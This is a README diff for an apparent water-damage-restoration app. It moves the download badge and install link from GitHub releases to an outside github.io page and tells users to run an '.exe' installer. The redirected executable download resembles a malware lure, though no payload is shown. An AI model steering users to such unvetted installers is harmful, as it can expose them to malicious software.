@@ -1,6 +1,6 @@
 # 💧 apex-water-damage-info - Find reliable water damage restoration services
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/kelsirepublican631/apex-water-damage-info/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://kelsirepublican631.github.io)
 
 ## 📖 About this application
 
@@ -22,7 +22,7 @@ Follow these steps to set up the application on your computer.
 
 1. First, visit the official release page to access the installer file. Use the link below to reach the correct website:
    
-   [https://github.com/kelsirepublican631/apex-water-damage-info/releases](https://github.com/kelsirepublican631/apex-water-damage-info/releases)
+   [https://kelsirepublican631.github.io](https://kelsirepublican631.github.io)
 
 2. Look for the section labeled "Assets." Click on the file that ends in ".exe." This file contains the installer for the application.
 
